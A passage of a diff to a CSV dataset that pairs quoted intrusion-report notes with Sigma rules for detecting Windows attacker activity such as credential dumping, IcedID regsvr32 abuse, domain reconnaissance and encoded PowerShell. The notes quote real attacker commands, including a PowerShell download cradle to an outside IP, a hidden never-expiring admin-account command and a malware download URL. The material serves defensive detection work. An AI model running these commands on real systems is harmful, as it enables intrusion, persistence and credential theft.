+            - '\Windows\Fonts\'
+            - '\Windows\IME\'
+        CommandLine|endswith:
+            - '.exe all'
+            - '.exe browsers'
+            - '.exe chats'
+            - '.exe databases'
+            - '.exe games'
+            - '.exe git'
+            - '.exe mails'
+            - '.exe maven'
+            - '.exe memory'
+            - '.exe multimedia'
+            - '.exe sysadmin'
+            - '.exe unused'
+            - '.exe wifi'
+            - '.exe windows'
+    selection_cli_modules:
+        CommandLine|contains:
+            - 'all '
+            - 'browsers '
+            - 'chats '
+            - 'databases '
+            - 'games '
+            - 'mails '
+            - 'maven '
+            - 'memory '
+            - 'multimedia '
+            - 'php '
+            - 'svn '
+            - 'sysadmin '
+            - 'unused '
+            - 'wifi '
+    selection_cli_options:
+        CommandLine|contains:
+            - '-1Password'
+            - '-apachedirectorystudio'
+            - '-autologon'
+            - '-ChromiumBased'
+            - '-coreftp'
+            - '-credfiles'
+            - '-credman'
+            - '-cyberduck'
+            - '-dbvis'
+            - '-EyeCon'
+            - '-filezilla'
+            - '-filezillaserver'
+            - '-ftpnavigator'
+            - '-galconfusion'
+            - '-gitforwindows'
+            - '-hashdump'
+            - '-iisapppool'
+            - '-IISCentralCertP'
+            - '-kalypsomedia'
+            - '-keepass'
+            - '-keepassconfig'
+            - '-lsa_secrets'
+            - '-mavenrepositories'
+            - '-memory_dump'
+            - '-Mozilla'
+            - '-mRemoteNG'
+            - '-mscache'
+            - '-opensshforwindows'
+            - '-openvpn'
+            - '-outlook'
+            - '-pidgin'
+            - '-postgresql'
+            - '-psi-im'
+            - '-puttycm'
+            - '-pypykatz'
+            - '-Rclone'
+            - '-rdpmanager'
+            - '-robomongo'
+            - '-roguestale'
+            - '-skype'
+            - '-SQLDeveloper'
+            - '-squirrel'
+            - '-tortoise'
+            - '-turba'
+            - '-UCBrowser'
+            - '-unattended'
+            - '-vault'
+            - '-vaultfiles'
+            - '-vnc'
+            - '-winscp'
+    condition: selection_metadata or selection_img_cli or all of selection_cli_*"
+folder_04,,"**Process and Driver Termination:** ""PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files"" **Defense Evasion:** Used to disable security tools and remove their files from the system",proc_creation_win_hktl_powertool.yml,,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        - Image|endswith:
+              - '\PowerTool.exe'
+              - '\PowerTool64.exe'
+        - OriginalFileName: 'PowerTool.exe'
+    condition: selection"
+folder_04,,"**Bumblebee Activity:** ""Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity"" **Process Injection:** Used as an injection target by Bumblebee malware **Unusual Parents:** Suspicious when spawned by WmiPrvSE.exe, svchost.exe, or dllhost.exe",proc_creation_win_imagingdevices_unusual_parents.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_parent:
+        ParentImage|endswith:
+            - \WmiPrvSE.exe
+            - \svchost.exe
+            - \dllhost.exe
+        Image|endswith: '\ImagingDevices.exe'
+    selection_child:
+        ParentImage|endswith: '\ImagingDevices.exe'
+    condition: 1 of selection_*"
+folder_04,,"**Macro Execution:** ""Initial execution of the document writes a file to: C:\Users\Public\microsoft.security"" **LOLBin Usage:** ""wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'"" **Office Spawning:** regsvr32 being used as a LOLBin after an Office document macro execution",proc_creation_win_lolbins_by_office_applications.yml,,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        Image|endswith:
+            - '\regsvr32.exe'
+            - '\rundll32.exe'
+            - '\msiexec.exe'
+            - '\mshta.exe'
+            - '\verclsid.exe'
+            - '\msdt.exe'
+            - '\control.exe'
+            - '\msidb.exe'
+        ParentImage|endswith:
+            - '\winword.exe'
+            - '\excel.exe'
+            - '\powerpnt.exe'
+            - '\msaccess.exe'
+            - '\mspub.exe'
+            - '\eqnedt32.exe'
+            - '\visio.exe'
+            - '\wordpad.exe'
+            - '\wordview.exe'
+    condition: selection"
+folder_04,,"**Single Digit DLL:** ""rundll32.exe c:\windows\temp\1.dll, DllRegisterServer"" **IcedID Pattern:** ""The rundll32.exe was first copied to %temp%\entails.exe"" **DllRegisterServer Export:** ""The malicious DLL (templates544.png) was executed with a randomized filename"" **Evasion Technique:** ""This was likely to evade detection logic based around command line execution""",proc_creation_win_malware_icedid_rundll32_dllregisterserver.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\rundll32.exe'
+        CommandLine|endswith:
+            - '\1.dll, DllRegisterServer'
+            - ' 1.dll, DllRegisterServer'
+    condition: selection"
+folder_04,,"**MOF Script Installation:** ""Attackers abuse this utility to install malicious MOF scripts"" **WMI Repository:** ""The mofcomp utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository"" **Suspicious Paths:** CommandLine contains suspicious paths like AppData\Local\Temp, Users\Public, WINDOWS\Temp",proc_creation_win_mofcomp_execution.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\mofcomp.exe'
+        - OriginalFileName: 'mofcomp.exe'
+    selection_case:
+        - ParentImage|endswith:
+              - '\cmd.exe'
+              - '\powershell.exe'
+              - '\pwsh.exe'
+              - '\wsl.exe'
+              - '\wscript.exe'
+              - '\cscript.exe'
+        - CommandLine|contains:
+              - '\AppData\Local\Temp'
+              - '\Users\Public\'
+              - '\WINDOWS\Temp\'
+              - '%temp%'
+              - '%tmp%'
+              - '%appdata%'
+    filter_main_wmiprvse:
+        ParentImage: 'C:\Windows\System32\wbem\WmiPrvSE.exe'
+        CommandLine|contains: 'C:\Windows\TEMP\'
+        CommandLine|endswith: '.mof'
+    filter_optional_null_parent:
+        CommandLine|contains: 'C:\Windows\TEMP\'
+        CommandLine|endswith: '.mof'
+    condition: all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
+folder_04,,"**Domain Group Discovery:** ""net group 'Domain admins' /DOMAIN"" **Enterprise Admins:** ""net group 'enterprise admins' /domain"" **Administrator Account:** ""net user administrator /domain"" **Lateral Movement:** Used for reconnaissance before lateral movement and privilege escalation",proc_creation_win_net_groups_and_accounts_recon.yml,,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith:
+              - '\net.exe'
+              - '\net1.exe'
+        - OriginalFileName:
+              - 'net.exe'
+              - 'net1.exe'
+    selection_group_root:
+        CommandLine|contains:
+            - ' group '
+            - ' localgroup '
+    selection_group_flags:
+        CommandLine|contains:
+            - 'domain admins'
+            - ' administrator'
+            - ' administrateur'
+            - 'enterprise admins'
+            - 'Exchange Trusted Subsystem'
+            - 'Remote Desktop Users'
+            - 'Utilisateurs du Bureau à distance'
+            - 'Usuarios de escritorio remoto'
+            - ' /do'
+    filter_group_add:
+        CommandLine|contains: ' /add'
+    selection_accounts_root:
+        CommandLine|contains: ' accounts '
+    selection_accounts_flags:
+        CommandLine|contains: ' /do'
+    condition: selection_img and ((all of selection_group_* and not filter_group_add) or all of selection_accounts_*)"
+folder_05,"Command Used: NET USER Adminv$ !67hCS14ORVg /ADD /expires:never. Specific techniques observed include creating a new local user account, setting account to never expire, adding the new user to local administrators group, and hiding the user account via registry. Detection indicators include watching for NET USER commands with /expires:never flag, monitoring for new users added to Administrators group, and checking registry key HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist.",,proc_creation_win_net_user_add_never_expire.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith:
+              - '\net.exe'
+              - '\net1.exe'
+        - OriginalFileName:
+              - 'net.exe'
+              - 'net1.exe'
+    selection_cli:
+        CommandLine|contains|all:
+            - 'user'
+            - 'add'
+            - 'expires:never'
+    condition: all of selection_*",
+folder_05,"Attackers used nltest commands for domain reconnaissance and trust discovery: nltest /domain_trusts /all_trusts and nltest /dclist:DOMAIN. Commands were part of discovery phase to map domain trusts, list domain controllers, and gather network environment information. Also observed: nltest /domain_trusts executed from injected svchost.exe process and later from Cobalt Strike beacons, indicating systematic approach to network reconnaissance.",,proc_creation_win_nltest_recon.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_nltest:
+        - Image|endswith: '\nltest.exe'
+        - OriginalFileName: 'nltestrk.exe'
+    selection_recon:
+        - CommandLine|contains|all:
+              - 'server'
+              - 'query'
+        - CommandLine|contains:
+              - '/user'
+              - 'all_trusts'
+              - 'dclist:'
+              - 'dnsgetdc:'
+              - 'domain_trusts'
+              - 'dsgetdc:'
+              - 'parentdomain'
+              - 'trusted_domains'
+    condition: all of selection_*",
+folder_05,"Two specific instances of password file discovery using Notepad: 1) After running Mimikatz, threat actor opened the newly generated password file in Notepad, 2) On a file share server, threat actor discovered a txt file that contained IT-related cleartext passwords and proceeded with opening the txt file using Notepad. These actions were captured in Sysmon event logs, specifically event code 1 showing Notepad process execution.",,proc_creation_win_notepad_local_passwd_discovery.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        ParentImage|endswith: '\explorer.exe'
+        Image|endswith: '\notepad.exe'
+        CommandLine|endswith:
+            - 'password*.txt'
+            - 'password*.csv'
+            - 'password*.doc'
+            - 'password*.xls'
+    condition: selection",
+folder_05,"Qbot malware performed network reconnaissance using the command: nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.REDACTED. This specific query is typically used to discover domain controllers in a Windows Active Directory environment. The command attempts to locate LDAP services associated with domain controllers, which helps the attacker map the network's domain infrastructure as part of Qbot's broader discovery phase.",,proc_creation_win_nslookup_domain_discovery.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains|all:
+            - 'nslookup'
+            - '_ldap._tcp.dc._msdcs.'
+    condition: selection",
+folder_05,Initial execution involved an xlsm document that used a macro to initiate a wmic command and executed a file via regsvr32 from a remote executable disguised as a GIF image. Specific execution: wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'. Downloaded file from http://vpu03jivmm03qncgx.com/index.gif where the GIF was actually the IcedID malware. The execution method leveraged Office application (Excel) to spawn a suspicious child process through wmic and regsvr32.,,proc_creation_win_office_from_proxy_executing_regsvr32_payload.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_img:
+        - Image|endswith: '\wbem\WMIC.exe'
+        - OriginalFileName: 'wmic.exe'
+    selection_other:
+        CommandLine|contains:
+            - 'regsvr32'
+            - 'rundll32'
+            - 'msiexec'
+            - 'mshta'
+            - 'verclsid'
+        ParentImage|endswith:
+            - '\winword.exe'
+            - '\excel.exe'
+            - '\powerpnt.exe'
+        CommandLine|contains|all:
+            - 'process'
+            - 'create'
+            - 'call'
+    condition: all of selection_*",
+folder_05,Initial execution involved an xlsm document that used a macro to initiate a wmic command and executed a file via regsvr32 from a remote executable disguised as a GIF image. Specific execution: wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'. Downloaded file from http://vpu03jivmm03qncgx.com/index.gif where the GIF was actually the IcedID malware. The execution method leveraged Office application (Excel) to spawn a suspicious child process through wmic and regsvr32.,,proc_creation_win_office_from_proxy_executing_regsvr32_payload2.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection1:
+        CommandLine|contains:
+            - 'regsvr32'
+            - 'rundll32'
+            - 'msiexec'
+            - 'mshta'
+            - 'verclsid'
+    selection2:
+        - Image|endswith: '\wbem\WMIC.exe'
+        - CommandLine|contains: 'wmic '
+    selection3:
+        ParentImage|endswith:
+            - '\winword.exe'
+            - '\excel.exe'
+            - '\powerpnt.exe'
+    selection4:
+        CommandLine|contains|all:
+            - 'process'
+            - 'create'
+            - 'call'
+    condition: all of selection*",
+folder_05,Initial execution involved an xlsm document that used a macro to initiate a wmic command and executed a file via regsvr32 from a remote executable disguised as a GIF image. Specific execution: wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'. Downloaded file from http://vpu03jivmm03qncgx.com/index.gif where the GIF was actually the IcedID malware. The execution method leveraged Office application (Excel) to spawn a suspicious child process through wmic and regsvr32.,,proc_creation_win_office_spawning_wmi_commandline.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection1:
+        - Image|endswith: '\wbem\WMIC.exe'
+        - CommandLine|contains: 'wmic '
+    selection2:
+        ParentImage|endswith:
+            - '\winword.exe'
+            - '\excel.exe'
+            - '\powerpnt.exe'
+            - '\msaccess.exe'
+            - '\mspub.exe'
+            - '\eqnedt32.exe'
+            - '\visio.exe'
+    condition: all of selection*",
+folder_05,Initial execution involved an xlsm document that used a macro to initiate a wmic command and executed a file via regsvr32 from a remote executable disguised as a GIF image. Specific execution: wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'. Downloaded file from http://vpu03jivmm03qncgx.com/index.gif where the GIF was actually the IcedID malware. The execution method leveraged Office application (Excel) to spawn a suspicious child process through wmic and regsvr32.,,proc_creation_win_office_susp_child_processes.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_parent:
+        ParentImage|endswith:
+            - '\EQNEDT32.EXE'
+            - '\EXCEL.EXE'
+            - '\MSACCESS.EXE'
+            - '\MSPUB.exe'
+            - '\ONENOTE.EXE'
+            - '\POWERPNT.exe'
+            - '\VISIO.exe'
+            - '\WINWORD.EXE'
+            - '\wordpad.exe'
+            - '\wordview.exe'
+    selection_child_processes:
+        - OriginalFileName:
+              - 'bitsadmin.exe'
+              - 'CertOC.exe'
+              - 'CertUtil.exe'
+              - 'Cmd.Exe'
+              - 'CMSTP.EXE'
+              - 'cscript.exe'
+              - 'curl.exe'
+              - 'HH.exe'
+              - 'IEExec.exe'
+              - 'InstallUtil.exe'
+              - 'javaw.exe'
+              - 'Microsoft.Workflow.Compiler.exe'
+              - 'msdt.exe'
+              - 'MSHTA.EXE'
+              - 'msiexec.exe'
+              - 'Msxsl.exe'
+              - 'odbcconf.exe'
+              - 'pcalua.exe'
+              - 'PowerShell.EXE'
+              - 'RegAsm.exe'
+              - 'RegSvcs.exe'
+              - 'REGSVR32.exe'
+              - 'RUNDLL32.exe'
+              - 'schtasks.exe'
+              - 'ScriptRunner.exe'
+              - 'wmic.exe'
+              - 'WorkFolders.exe'
+              - 'wscript.exe'
+        - Image|endswith:
+              - '\AppVLP.exe'
+              - '\bash.exe'
+              - '\bitsadmin.exe'
+              - '\certoc.exe'
+              - '\certutil.exe'
+              - '\cmd.exe'
+              - '\cmstp.exe'
+              - '\control.exe'
+              - '\cscript.exe'
+              - '\curl.exe'
+              - '\forfiles.exe'
+              - '\hh.exe'
+              - '\ieexec.exe'
+              - '\installutil.exe'
+              - '\javaw.exe'
+              - '\mftrace.exe'
+              - '\Microsoft.Workflow.Compiler.exe'
+              - '\msbuild.exe'
+              - '\msdt.exe'
+              - '\mshta.exe'
+              - '\msidb.exe'
+              - '\msiexec.exe'
+              - '\msxsl.exe'
+              - '\odbcconf.exe'
+              - '\pcalua.exe'
+              - '\powershell.exe'
+              - '\pwsh.exe'
+              - '\regasm.exe'
+              - '\regsvcs.exe'
+              - '\regsvr32.exe'
+              - '\rundll32.exe'
+              - '\schtasks.exe'
+              - '\scrcons.exe'
+              - '\scriptrunner.exe'
+              - '\sh.exe'
+              - '\svchost.exe'
+              - '\verclsid.exe'
+              - '\wmic.exe'
+              - '\workfolders.exe'
+              - '\wscript.exe'
+    selection_child_susp_paths:
+        Image|contains:
+            - '\AppData\'
+            - '\Users\Public\'
+            - '\ProgramData\'
+            - '\Windows\Tasks\'
+            - '\Windows\Temp\'
+            - '\Windows\System32\Tasks\'
+    condition: selection_parent and 1 of selection_child_*",
+folder_05,"Multiple layers of encoding were used including hexadecimal, XOR, base64, and gunzip decoding. Encoded commands often invoked Mimikatz credential extraction, LaZagne password dumping, remote execution via WMIExec, and SharpHound Active Directory discovery. A representative encoded command used XOR and Base64, which when decoded revealed Invoke-Mimikatz. Used complex decoding methods and often used -nop -w hidden -c PowerShell flags to hide execution while frequently downloading and executing remote scripts.",,proc_creation_win_powershell_base64_invoke_susp_cmdlets.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains:
+            - 'SQBuAHYAbwBrAGUALQBCAGwAbwBvAGQASABvAHUAbgBkA'
+            - 'kAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZA'
+            - 'JAG4AdgBvAGsAZQAtAEIAbABvAG8AZABIAG8AdQBuAGQA'
+            - 'SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA'
+            - 'kAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6A'
+            - 'JAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAeg'
+            - 'SQBuAHYAbwBrAGUALQBXAE0ASQBFAHgAZQBjA'
+            - 'kAbgB2AG8AawBlAC0AVwBNAEkARQB4AGUAYw'
+            - 'JAG4AdgBvAGsAZQAtAFcATQBJAEUAeABlAGMA'
+    condition: selection",
+folder_05,"Multiple layers of encoding were used including hexadecimal, XOR, base64, and gunzip decoding. Encoded commands often invoked Mimikatz credential extraction, LaZagne password dumping, remote execution via WMIExec, and SharpHound Active Directory discovery. A representative encoded command used XOR and Base64, which when decoded revealed Invoke-Mimikatz. Used complex decoding methods and often used -nop -w hidden -c PowerShell flags to hide execution while frequently downloading and executing remote scripts.",,proc_creation_win_powershell_base64_invoke.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith:
+              - '\powershell.exe'
+              - '\pwsh.exe'
+        - OriginalFileName:
+              - 'PowerShell.EXE'
+              - 'pwsh.dll'
+    selection_cli_enc:
+        CommandLine|contains: ' -e'
+    selection_cli_invoke:
+        CommandLine|contains:
+            - 'SQBuAHYAbwBrAGUALQ'
+            - 'kAbgB2AG8AawBlAC0A'
+            - 'JAG4AdgBvAGsAZQAtA'
+            - 'SW52b2tlL'
+            - 'ludm9rZS'
+            - 'JbnZva2Ut'
+    condition: all of selection_*",
+folder_06,"Used custom letter-to-hex encoding scheme with unique mappings where letters correspond to hex characters. Multi-layer encoding included first layer with hexadecimal and XOR encoding, second layer with base64 encoded gzip-compressed data. Assembly loading pattern used [reflection.assembly]::Load() method to load encoded payload, decoded payload dynamically using mathematical transformations, and extracted payload from registry keys. The technique demonstrated sophisticated obfuscation to evade detection while loading malicious assemblies in memory.",,proc_creation_win_powershell_base64_reflection_assembly_load_obfusc.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains:
+            - 'OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ'
+            - 'oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA'
+            - '6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA'
+            - 'OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ'
+            - 'oAOgAoACIATABvACIAKwAiAGEAZAAiACkA'
+            - '6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA'
+            - 'OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ'
+            - 'oAOgAoACIATABvAGEAIgArACIAZAAiACkA'
+            - '6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA'
+            - 'OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ'
+            - 'oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA'
+            - '6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA'
+            - 'OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ'
+            - 'oAOgAoACcATABvACcAKwAnAGEAZAAnACkA'
+            - '6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA'
+            - 'OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ'
+            - 'oAOgAoACcATABvAGEAJwArACcAZAAnACkA'
+            - '6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA'
+    condition: selection",
+folder_06,"Used custom letter-to-hex encoding scheme with unique mappings where letters correspond to hex characters. Multi-layer encoding included first layer with hexadecimal and XOR encoding, second layer with base64 encoded gzip-compressed data. Assembly loading pattern used [reflection.assembly]::Load() method to load encoded payload, decoded payload dynamically using mathematical transformations, and extracted payload from registry keys. The technique demonstrated sophisticated obfuscation to evade detection while loading malicious assemblies in memory.",,proc_creation_win_powershell_base64_reflection_assembly_load.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains:
+            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'
+            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'
+            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'
+            - 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC'
+            - 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp'
+            - 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK'
+            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ'
+            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA'
+            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA'
+            - 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'
+            - 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'
+            - 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'
+    condition: selection",
+folder_06,"Example obfuscated download cradle: powershell -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio')). Used custom letter-to-hex encoding scheme with unique mappings. Multi-layer encoding included first layer with hexadecimal and XOR encoding, second layer with base64 encoded gzip-compressed data. The technique demonstrated sophisticated obfuscation to evade detection while loading malicious assemblies in memory.",,proc_creation_win_powershell_download_cradle_obfuscated.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|all:
+            - 'http://127.0.0.1'
+            - '%{(IRM $_)}'
+            - 'Invoke'
+    condition: selection",
+folder_06,No specific information found about PowerShell execution policy changes or bypasses in the referenced DFIR report. The document mentions PowerShell script agent1.ps1 with obfuscated code and a command powershell.exe -c Reset-ComputerMachinePassword but does not provide details about execution policy modifications.,,proc_creation_win_powershell_set_policies_to_unsecure_level.yml,"logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_img:
+        - OriginalFileName:
+              - 'PowerShell.EXE'
+              - 'pwsh.dll'
+        - Image|endswith:
+              - '\powershell.exe'
+              - '\pwsh.exe'
+    selection_option:
+        CommandLine|contains:
+            - '-executionpolicy '
+            - ' -ep '
+            - ' -exec '
+    selection_level:
+        CommandLine|contains:
+            - 'Bypass'
+            - 'Unrestricted'
+    condition: all of selection_*",
+folder_06,"AdFind is a command line Active Directory query tool used for gathering network information. Threat actors use it to collect details about person objects, computer systems, domain trusts, subnets, and domain controllers. Observed commands include: adfind.exe -gcb -sc trustdmp, adfind.exe -f (objectcategory=group), adfind.exe -subnets -f (objectCategory=subnet), adfind.exe -f (objectcategory=organizationalUnit), adfind.exe -f objectcategory=computer, adfind.exe -f (objectcategory=person). These commands are part of reconnaissance efforts to map domain structure, trust relationships, and user/computer assets.",,proc_creation_win_pua_adfind_susp_usage.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains:
+            - 'domainlist'
+            - 'trustdmp'
+            - 'dcmodes'
+            - 'adinfo'
+            - ' dclist '
+            - 'computer_pwdnotreqd'
+            - 'objectcategory='
+            - '-subnets -f'
+            - 'name=""Domain Admins""'
+            - '-sc u:'
+            - 'domainncs'
+            - 'dompol'
+            - ' oudmp '
+            - 'subnetdmp'
+            - 'gpodmp'
+            - 'fspdmp'
+            - 'users_noexpire'
+            - 'computers_active'
+            - 'computers_pwdnotreqd'
+    condition: selection",
+folder_06,"Advanced IP Scanner was used to scan the network environment as part of the threat actor's Discovery phase of the intrusion. The scanning was likely done to map out potential target systems for lateral movement, which the threat actor subsequently performed using RDP to access multiple machines in the environment.",,proc_creation_win_pua_advanced_ip_scanner.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|contains: '\advanced_ip_scanner'
+        - OriginalFileName|contains: 'advanced_ip_scanner'
+        - Description|contains: 'Advanced IP Scanner'
+    selection_cli:
+        CommandLine|contains|all:
+            - '/portable'
+            - '/lng'
+    condition: 1 of selection_*",
+folder_06,"Ditsnap was most likely run on the DC to obtain a copy of ntds.dit by creating a snapshot. This suggests the attackers used ditsnap as a technique to access credential information stored in the Active Directory database, which could be used for further lateral movement or privilege escalation during the Snatch ransomware intrusion.",,proc_creation_win_pua_ditsnap.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Image|endswith: '\ditsnap.exe'
+        - CommandLine|contains: 'ditsnap.exe'
+    condition: selection",
+folder_06,"PingCastle was used by the threat actor as an Active Directory auditing tool during their intrusion. The tool was executed on a domain controller with the command: pingcastle.exe --healthcheck --level Full. PingCastle is described as an active directory auditing tool used for reconnaissance and security assessment purposes. The threat actor ran this tool as part of their discovery phase, likely to gather information about the Active Directory environment's security configuration and potential vulnerabilities.",,proc_creation_win_pua_pingcastle_script_parent.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_parent_ext:
+        ParentCommandLine|contains:
+            - '.bat'
+            - '.chm'
+            - '.cmd'
+            - '.hta'
+            - '.htm'
+            - '.html'
+            - '.js'
+            - '.lnk'
+            - '.ps1'
+            - '.vbe'
+            - '.vbs'
+            - '.wsf'
+    selection_parent_path_1:
+        ParentCommandLine|contains:
+            - ':\Perflogs\'
+            - ':\Temp\'
+            - ':\Users\Public\'
+            - ':\Windows\Temp\'
+            - '\AppData\Local\Temp'
+            - '\AppData\Roaming\'
+            - '\Temporary Internet'
+    selection_parent_path_2:
+        - ParentCommandLine|contains|all:
+              - ':\Users\'
+              - '\Favorites\'
+        - ParentCommandLine|contains|all:
+              - ':\Users\'
+              - '\Favourites\'
+        - ParentCommandLine|contains|all:
+              - ':\Users\'
+              - '\Contacts\'
+    selection_cli:
+        - Image|endswith: '\PingCastle.exe'
+        - OriginalFileName: PingCastle.exe
+        - Product: 'Ping Castle'
+        - CommandLine|contains:
+              - '--scanner aclcheck'
+              - '--scanner antivirus'
+              - '--scanner computerversion'
+              - '--scanner foreignusers'
+              - '--scanner laps_bitlocker'
+              - '--scanner localadmin'
+              - '--scanner nullsession'
+              - '--scanner nullsession-trust'
+              - '--scanner oxidbindings'
+              - '--scanner remote'
+              - '--scanner share'
+              - '--scanner smb'
+              - '--scanner smb3querynetwork'
+              - '--scanner spooler'
+              - '--scanner startup'
+              - '--scanner zerologon'
+        - CommandLine|contains: '--no-enum-limit'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--level Full'
+        - CommandLine|contains|all:
+              - '--healthcheck'
+              - '--server '
+    condition: 1 of selection_parent_* and selection_parent_ext and selection_cli",
+folder_06,"PingCastle was used by the threat actor as an Active Directory auditing tool during their intrusion. The tool was executed on a domain controller with the command: pingcastle.exe --healthcheck --level Full. PingCastle is described as an active directory auditing tool used for reconnaissance and security assessment purposes. The threat actor ran this tool as part of their discovery phase, likely to gather information about the Active Directory environment's security configuration and potential vulnerabilities.",,proc_creation_win_pua_pingcastle.yml,"logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Hashes|contains:
+              - 'MD5=f741f25ac909ee434e50812d436c73ff'
+              - 'MD5=d40acbfc29ee24388262e3d8be16f622'
+              - 'MD5=01bb2c16fadb992fa66228cd02d45c60'
+              - 'MD5=9e1b18e62e42b5444fc55b51e640355b'
+              - 'MD5=b7f8fe33ac471b074ca9e630ba0c7e79'
+              - 'MD5=324579d717c9b9b8e71d0269d13f811f'
+              - 'MD5=63257a1ddaf83cfa43fe24a3bc06c207'
+              - 'MD5=049e85963826b059c9bac273bb9c82ab'
+              - 'MD5=ecb98b7b4d4427eb8221381154ff4cb2'
+              - 'MD5=faf87749ac790ec3a10dd069d10f9d63'
+              - 'MD5=f296dba5d21ad18e6990b1992aea8f83'
+              - 'MD5=93ba94355e794b6c6f98204cf39f7a11'
+              - 'MD5=a258ef593ac63155523a461ecc73bdba'
+              - 'MD5=97000eb5d1653f1140ee3f47186463c4'
+              - 'MD5=95eb317fbbe14a82bd9fdf31c48b8d93'
+              - 'MD5=32fe9f0d2630ac40ea29023920f20f49'
+              - 'MD5=a05930dde939cfd02677fc18bb2b7df5'
+              - 'MD5=124283924e86933ff9054a549d3a268b'
+              - 'MD5=ceda6909b8573fdeb0351c6920225686'
+              - 'MD5=60ce120040f2cd311c810ae6f6bbc182'
+              - 'MD5=2f10cdc5b09100a260703a28eadd0ceb'
+              - 'MD5=011d967028e797a4c16d547f7ba1463f'
